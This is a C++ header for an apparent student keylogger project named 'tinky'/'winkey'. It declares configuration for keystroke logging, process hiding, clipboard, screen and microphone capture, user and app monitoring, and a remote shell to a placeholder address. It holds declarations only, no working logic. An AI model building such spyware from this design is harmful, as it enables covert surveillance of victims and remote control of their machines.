#pragma once

#include <filesystem>
#include <fstream>
#include <functional>
#include <string>
#include <vector>

constexpr wchar_t CONFIG_FILE[]    = L"config.ini";
constexpr wchar_t KEYLOGGER_EXE[]  = L"winkey.exe";
constexpr wchar_t SERVICE_EXE[]    = L"svc.exe";
constexpr wchar_t SERVICE_NAME_W[] = L"tinky";
constexpr char    SERVICE_NAME[]   = "tinky";
constexpr char    STOP_EVENT[]     = "Global\\tinkyStopEvent";

/* ═════════════════════════════════════════════════════════════════════
   Configuration
═════════════════════════════════════════════════════════════════════ */

struct Config
{
    Config();

    Config(const Config&)                = delete;
    Config& operator=(const Config&)     = delete;
    Config(Config&&) noexcept            = default;
    Config& operator=(Config&&) noexcept = default;

    ~Config() = default;

    std::ofstream         KeylogFile;
    std::ofstream         DebugLogFile;
    std::filesystem::path KeylogPath   = "winkey.log";
    std::filesystem::path DebugLogPath = "winkey.debug.log";

    bool DebugMode = true;

    bool PrintConf         = false;
    bool HideProcess       = false;
    bool ClipboardLogging  = false;
    bool ScreenCapture     = false;
    bool MicrophoneCapture = false;
    bool MaskedCapture     = false;
    bool RemoteShell       = false;

    uint32_t ScreenshotIntervalSec = 1;
    uint32_t MicrophoneDurationSec = 10;

    std::vector<std::string> MonitoredApps  = {};
    std::vector<std::string> MonitoredUsers = {};

    std::string RemoteIp   = "42.42.42.42";
    uint16_t    RemotePort = 4242;
    char        Padding[6] = {42, 42, 42, 42, 42, 42};  // Ensure 64-bit alignment (cf. warning C4820)

    std::unordered_map<std::string_view, std::function<void(std::string_view)>> Handlers;

    void PrintConfig();
    bool Init(const std::filesystem::path& configPath);
};

inline Config gConfig;
